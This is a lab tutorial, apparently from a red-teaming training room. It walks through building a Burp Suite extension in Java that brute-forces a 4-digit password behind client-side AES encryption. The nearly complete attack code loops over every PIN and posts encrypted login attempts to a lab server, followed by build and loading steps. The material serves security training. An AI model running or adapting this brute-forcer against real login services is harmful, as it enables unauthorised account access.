# Custom Tooling and Burp Plugins

The ability to develop bespoke tools is a vital skill for web application red teaming, as off-the-shelf plugins rarely meet every specific requirement. This module explores how to create custom solutions using Burp Suite to enhance both manual and automated testing.

### Key Concepts

*   **Custom Development**: Building your own tools is often necessary when existing software lacks the specific functionality required for a unique exploit or audit.
*   **The Role of Burp Suite**: Burp acts as an intercepting proxy, providing a gateway to view and alter traffic between the web application and the server.
*   **Built-in Versatility**: Features like the Repeater and Intruder (for brute forcing) provide a foundation that custom plugins can expand upon.
*   **Plugin Integration**: Developing Burp plugins allows for a hybrid approach, where custom logic is applied to the standard interception workflow.
*   **Universal Principles**: While this room focuses on Burp, the logic of modifying and automating requests can be applied to any intercepting proxy.

### Benefits and Drawbacks

*   **Benefits**: High versatility, the ability to automate complex manual tasks, and deep integration with existing web testing workflows.
*   **Drawbacks**: Each custom approach has unique trade-offs in terms of development time and complexity.

Burp extensions automate testing workflows and enhance functionality, with many available through the built-in BApp Store. The ```"Decoder Improved"``` extension is highlighted as a key tool for efficiently handling complex encoding layers directly within the application. For more information, visit PortSwigger's BApp Store documentation.

# Burp Suite Extension Development: Brute-Force Automation with Encryption

This summary details the creation of a bespoke Burp Suite extension using the **Montoya API**. It focuses on a scenario where client-side encryption prevents the use of traditional tools like *Intruder*.

### 1. The Challenge Scenario
During a web audit, we discovered that login forms do not send data in plain text. The `form-submit.js` file reveals that the application encrypts credentials before submission:

**JavaScript Snippet (Client-side Logic):**
```javascript
// Generates a random 16-byte AES key
const rawAesKey = window.crypto.getRandomValues(new Uint8Array(16));
const aesKey = await getSecretKey(rawAesKey);

// Prepares the raw data
let rawdata = "username=" + user + "&password=" + pass;

// Encrypts with AES and encodes in Base64
let data = window.btoa(String.fromCharCode(new Uint8Array(await encryptMessage(aesKey, enc.encode(rawdata).buffer))));
```
**The Problem:** Burp Intruder cannot generate these dynamic keys or perform AES encryption for every single attempt (0000-9999).

---

### 2. Extension Project Structure
Modern extensions are managed using **Gradle** and the **Montoya API**. The hierarchical structure is as follows:

```text
101Burp/
│── src/main/java/BruteForce.java  <-- Main logic (Java)
│── build.gradle                   <-- Dependencies (Montoya API)
│── gradlew                        <-- Compilation script
```

**Dependency Configuration (`build.gradle`):**
```gradle
dependencies {
    // Import the necessary API to interface with Burp
    compileOnly("net.portswigger.burp.extensions:montoya-api:2025.2")
}
```

---

### 3. Main Code Anatomy (`BruteForce.java`)

#### A. Initialising the Extension
The `initialize` method is the starting point. It registers the extension within Burp and prepares the graphical interface.

```java
@Override
public void initialize(MontoyaApi api) {
    this.api = api;
    // Sets the name that will appear in the "Extensions" tab
    api.extension().setName("Burp Password Brute-Forcer");
    
    // Executes the UI creation on the Swing event dispatch thread
    SwingUtilities.invokeLater(this::createUI);
}
```

#### B. Graphical User Interface (GUI)
The `createUI` method builds a window (`JFrame`) to capture dynamic parameters, such as the target username and the server's IP address.

```java
private void createUI() {
    JFrame frame = new JFrame("Brute Force Attack");
    JTextField usernameField = new JTextField("ecorp_user");
    JButton startButton = new JButton("Start Attack");

    // Button Action: Launches the attack in a separate thread to avoid freezing Burp
    startButton.addActionListener((ActionEvent e) -> {
        new Thread(() -> startBruteForce(usernameField.getText(), "SERVER_IP:8443")).start();
    });
    // ... visual configuration ...
}
```

#### C. Automated Brute-Force Logic
This is where the extension replicates the browser's behaviour: generating keys, encrypting data, and sending HTTP requests.

```java
private void startBruteForce(String username, String serverUrl) {
    // Loop to test all 4-digit combinations (0000 to 9999)
    for (int i = 0; i <= 9999; i++) {
        String password = String.format("%04d", i);

        // REPLICATING THE JS:
        SecretKey aesKey = generateAESKey(); // Internal Java function
        byte[] encryptedData = encryptAES("username=" + username + "&password=" + password, aesKey);
        
        // Constructing the encoded payload
        String postBody = "mac=" + encode(aesKey) + "&data=" + encode(encryptedData);

        // Sending the request via the Burp API
        HttpRequest request = HttpRequest.httpRequest(httpService, createHttpRequest(postBody));
        HttpResponse response = api.http().sendRequest(request);
        
        // Logging the result to the Burp console
        api.logging().logToOutput("Testing: " + password + " - Status: " + response.statusCode());
    }
}
```

---

### Workflow Summary
1.  **Analysis**: Identify the encryption logic within the website's source code.
2.  **Development**: Implement `BurpExtension` using the Montoya API in Java.
3.  **Compilation**: Generate the `.jar` file (e.g., `./gradlew build`).
4.  **Loading**: Import the `.jar` into the **Extensions > Installed** tab in Burp Suite.
5.  **Execution**: Use the extension window to launch the automated authentication bypass attack.


# Complete Java Implementation for Burp Suite Brute-Forcer

The following code combines the graphical interface and the core brute-force logic. It is designed to run as a **Burp Suite extension** using the **Montoya API**, allowing for real-time interaction with web traffic and encrypted payloads.

### Full Source Code (BruteForce.java)

```java
import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class BruteForce implements BurpExtension {
    private MontoyaApi api;

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        api.extension().setName("Burp Password Brute-Forcer");
        SwingUtilities.invokeLater(this::createUI);
    }

    private void createUI() {
        JFrame frame = new JFrame("Brute Force Attack");
        frame.setSize(300, 180);
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        frame.setLayout(new GridBagLayout());
        frame.setResizable(false);

        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(5, 5, 5, 5);
        gbc.fill = GridBagConstraints.HORIZONTAL;

        // Username Field
        gbc.gridx = 0; gbc.gridy = 0;
        frame.add(new JLabel("Username:"), gbc);
        JTextField usernameField = new JTextField("ecorp_user");
        gbc.gridx = 1;
        frame.add(usernameField, gbc);

        // Server URL Field
        gbc.gridx = 0; gbc.gridy = 1;
        frame.add(new JLabel("Server URL:"), gbc);
        JTextField urlField = new JTextField("10.10.188.207:8443");
        gbc.gridx = 1;
        frame.add(urlField, gbc);

        // Start Button
        JButton startButton = new JButton("Start Attack");
        gbc.gridx = 0; gbc.gridy = 2; gbc.gridwidth = 2;
        gbc.fill = GridBagConstraints.CENTER;
        frame.add(startButton, gbc);

        frame.setLocationRelativeTo(null);
        frame.setVisible(true);

        startButton.addActionListener((ActionEvent e) -> {
            frame.dispose();
            new Thread(() -> startBruteForce(usernameField.getText().trim(), urlField.getText().trim())).start();
        });
    }

    private void startBruteForce(String username, String serverUrl) {
        if (username.isEmpty() || serverUrl.isEmpty()) {
            api.logging().logToOutput("Invalid input: Username or URL is empty.");
            return;
        }

        String[] parts = serverUrl.split(":");
        String host = parts[0];
        int port = Integer.parseInt(parts[1]);
        HttpService httpService = HttpService.httpService(host, port, true);

        // Brute force loop: 0000 to 9999
        for (int i = 0; i <= 9999; i++) {
            String password = String.format("%04d", i);

            try {
                // 1. Replicate Client-side Encryption
                SecretKey aesKey = generateAESKey();
                String encodedKey = Base64.getEncoder().encodeToString(aesKey.getEncoded());

                String rawdata = "username=" + username + "&password=" + password;
                byte[] encryptedData = encryptAES(rawdata, aesKey);
                String encodedData = Base64.getEncoder().encodeToString(encryptedData);

                // 2. Build POST Body
                String postBody = "mac=" + URLEncoder.encode(encodedKey, "UTF-8") +
                                  "&data=" + URLEncoder.encode(encodedData, "UTF-8");

                // 3. Send Request via Burp
                HttpRequest request = HttpRequest.httpRequest(httpService, createHttpRequest(postBody, host));
                HttpResponse response = api.http().sendRequest(request).response();

                int statusCode = response.statusCode();
                String responseBody = response.bodyToString();

                api.logging().logToOutput("Testing: " + password + " | Status: " + statusCode);

                // 4. Success Condition
                if (statusCode == 200 && responseBody.contains("result=")) {
                    api.logging().logToOutput("SUCCESS! Password found: " + password);
                    
                    // Decrypt response for verification
                    String encryptedBase64 = responseBody.split("=")[1].trim();
                    String decryptedResult = decryptAES(aesKey.getEncoded(), Base64.getDecoder().decode(encryptedBase64));
                    
                    SwingUtilities.invokeLater(() ->
                        JOptionPane.showMessageDialog(null, "Success! Password is: " + password + "\nDecrypted: " + decryptedResult)
                    );
                    break;
                }
            } catch (Exception e) {
                api.logging().logToError("Error at " + password + ": " + e.getMessage());
            }
        }
    }

    // Helper methods for Encryption/HTTP would be implemented here (encryptAES, generateAESKey, etc.)
}
```

---

### Detailed Breakdown

#### 1. The `createUI` Method (Graphical Interface)
*   **Frame Setup**: Creates a `JFrame` (window) titled "Brute Force Attack". It uses `GridBagLayout` for precise alignment of labels and text boxes.
*   **User Input**: Provides fields for the target **Username** and the **Server URL** (including port).
*   **Threading**: Crucially, when the "Start Attack" button is clicked, it launches `startBruteForce` in a **new Thread**. This prevents the Burp Suite interface from "freezing" while the thousands of requests are being processed.

#### 2. The `startBruteForce` Method (The Engine)
*   **Connection Setup**: Uses `HttpService` to define where Burp should send the traffic.
*   **The Loop**: Iterates from `0` to `9999`, padding the number with zeros (e.g., `0001`, `0042`) to match the 4-digit requirement.
*   **Encryption Simulation**: Inside the loop, it mimics the website's JavaScript by:
    *   Generating a new **AES key** for every attempt.
    *   Encrypting the credentials.
    *   Encoding the results in **Base64** and URL-encoding them for the POST body.
*   **Handling the Response**:
    *   It checks for an HTTP **200 OK** status.
    *   If found, it extracts the encrypted result from the server's response and **decrypts it** using the same key used for the request.
*   **Alerting the User**: If successful, it displays a `JOptionPane` pop-up to notify the pentester immediately.


# Finalising the Extension: Request Construction and Building

This section covers the manual construction of the HTTP request and the process of compiling the Java code into a functional Burp Suite extension.

### 1. The `createHttpRequest` Method
Since we are bypassing the standard Intruder, we must manually build the HTTP request string. This method ensures the headers and the encrypted body are formatted correctly for the server to process.

```java
private String createHttpRequest(String body, String serverUrl) {
    return "POST /login HTTP/1.1\r\n" +
            "Host: " + serverUrl + "\r\n" +
            "Content-Type: application/x-www-form-urlencoded\r\n" +
            "Content-Length: " + body.length() + "\r\n" +
            "\r\n" +
            body;
}
```

**Key Details:**
*   **Method & Endpoint**: It explicitly defines a `POST` request to the `/login` path.
*   **Headers**: It sets the `Host` dynamically and defines the `Content-Type` as a standard form submission.
*   **Content-Length**: It calculates the length of the encrypted body; without this, the server might reject the request or hang.
*   **The CRLF (`\r\n`)**: It uses the required carriage return and line feed characters to separate headers and the body.

---

### 2. Building the Extension (JAR Compilation)
Once the code is ready, it must be compiled into a **Java Archive (JAR)** file. This project uses **Gradle** to handle the heavy lifting.

**Steps to Compile:**
1.  **Navigate to Project**: Open your terminal and move to the project root:
    ```bash
    cd ~/101Burp/
    ```
2.  **Execute Build**: Run the Gradle build command:
    ```bash
    gradle build
    ```
3.  **Verify Success**: Look for the `BUILD SUCCESSFUL` message in your terminal.

---

### 3. Locating the Output
After a successful build, Gradle places the final executable file in a specific subdirectory. You will find your extension here:

*   **Path**: `~/101Burp/build/libs/`
*   **Filename**: `101Burp-1.0-SNAPSHOT.jar`

This is the file you will manually load into Burp Suite via the **Extensions > Installed > Add** menu.

Would you like to know how to **troubleshoot common Gradle errors** if the build fails?


# Importing and Executing the Extension in Burp Suite

Once you have successfully compiled the JAR file, the final step is to load it into Burp Suite to carry out the authentication bypass attack.

### 1. The Import Process
Follow these steps within the Burp Suite interface:

1.  **Extensions Tab**: Navigate to the main **Extensions** tab at the top of the window.
2.  **Add**: Click the **Add** button to start the manual import.
3.  **Select File**: 
    *   Ensure the extension type is set to **Java**.
    *   Click **Select File** and browse to the following path: `/101Burp/build/libs/`.
    *   Choose the file named: `101Burp-1.0-SNAPSHOT.jar`.
4.  **Load**: Click **Next**. Burp will load the extension and, providing there are no errors, it will execute immediately.

---

### 2. Configuring the Attack
Upon loading, the extension will automatically open a pop-up window (the graphical interface programmed in the `createUI` method). Enter the following details:

*   **Username**: `ecorp_user`
*   **Server Address**: `SECOND_VM_IP:8443` (Replace this with the actual IP of your target VM).
*   **Action**: Click the **Start Attack** button to begin the process.

### 3. Execution and Results
The extension will begin testing all 10,000 combinations (0000-9999). You can monitor the progress as follows:

*   **Output Tab**: Within the extension's tab in Burp, you will see real-time logs of every attempt.
*   **Success**: When the correct password is hit, a dialogue box will appear displaying the password and the decrypted server response.
*   **Secret Code**: Take note of the `result` variable in the response, as it often contains codes or tokens required for subsequent tasks.

---

### Post-Attack Summary
*   Copy the retrieved password.
*   Extract any "secret code" or tokens found in the response body.
*   Use these credentials to log in manually to the web application and verify your access.


